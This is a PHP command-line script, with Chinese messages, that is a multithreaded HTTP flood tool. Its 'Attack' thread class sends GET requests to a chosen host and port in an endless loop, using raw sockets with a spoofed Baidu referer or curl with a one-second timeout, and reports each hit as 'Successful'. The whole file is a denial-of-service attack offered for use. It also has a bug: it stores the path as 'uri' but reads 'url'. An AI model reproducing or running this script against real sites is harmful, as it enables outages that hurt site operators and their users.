<?php
if(!preg_match("/^[A-Za-z0-9\-\.]+$/", $argv[1])) {
        echo "[ERROR] 域名格式不正确\n";
        exit;
}
if(!preg_match("/^[0-9]+$/", $argv[2])) {
        echo "[ERROR] 端口格式不正确\n";
        exit;
}
if(!preg_match("/^[0-9]+$/", $argv[3])) {
        echo "[ERROR] 线程格式不正确\n";
        exit;
}
$usecurl = $argv[5] == "true" ? true : false;
$url = empty($argv[4]) ? "/" : $argv[4];
class Attack extends Thread {

        public function __construct($id, $host, $port = 80, $uri = "/", $usecurl = false) {
                $this->host = $host;
                $this->port = $port;
                $this->uri = $uri;
                $this->id = $id;
                $this->usecurl = $usecurl;
        }

        public function run() {
                while(true) {
                        if(!$this->usecurl) {
                                $fp = fsockopen($this->host, $this->port, $errno, $errstr, 10) or exit($errstr ."--->".$errno);
                                //构造post请求的头
                                $header = "GET {$this->url} HTTP/1.1\r\n";
                                $header .= "Host: {$this->host}\r\n";
                                $header .= "Referer: https://www.baidu.com/\r\n";
                                $header .= "Content-Type: application/x-www-form-urlencoded\r\n";
                                $header .= "Content-Length: 0\r\n";
                                $header .= "Connection: Close\r\n\r\n";
                                fputs($fp, $header);
                                fclose($fp);
                                echo "[" . $this->id . "] Successful\n";
                        } else {
                                $this->curl_request("http://{$this->host}:{$this->port}{$this->url}");
                                echo "[" . $this->id . "] Successful\n";
                        }
                }
        }

        public function curl_request($url, $post = '', $cookie = '', $headers = '', $returnCookie = 0) {
                $curl = curl_init();
                curl_setopt($curl, CURLOPT_URL, $url);
                curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)');
                curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
                curl_setopt($curl, CURLOPT_REFERER, $url);
                curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
                if ($post) {
                        curl_setopt($curl, CURLOPT_POST, 1);
                        curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
                }
                if ($cookie) {
                        curl_setopt($curl, CURLOPT_COOKIE, $cookie);
                }
                if ($headers) {
                        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
                }
                curl_setopt($curl, CURLOPT_HEADER, $returnCookie);
                curl_setopt($curl, CURLOPT_TIMEOUT, 1);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
                $data = curl_exec($curl);
                if (curl_errno($curl)) {
                        return curl_error($curl);
                }
                curl_close($curl);
                if ($returnCookie) {
                        list($header, $body) = explode("\r\n\r\n", $data, 2);
                        preg_match_all("/Set\-Cookie:([^;]*);/", $header, $matches);
                        $info['cookie'] = substr($matches[1][0], 1);
                        $info['content'] = $body;
                        return $info;
                } else {
                        return $data;
                }
        }
}
$host = $argv[1];
$port = $argv[2];
$thread = $argv[3];
echo "Start attack http://{$host}:{$port}{$url}\n";
echo "Use threads: {$thread}\n";
echo "Use curl mode: " . ($usecurl ? "true" : "false") . "\n";
//exit;
$att = Array();
for($i = 1;$i <= $thread;$i++) {
        $att[$i] = new Attack($i, $host, $port, $url, $usecurl);
}
for($i = 1;$i <= $thread;$i++) {
        $att[$i]->start();
}
$isrunning = true;
while($isrunning) {
        $running = 0;
        for($i = 1;$i <= $thread;$i++) {
                if($att[$i]->isRunning()) {
                        $running++;
                }
        }
        if($running == 0) {
                $isrunning = false;
        }
}
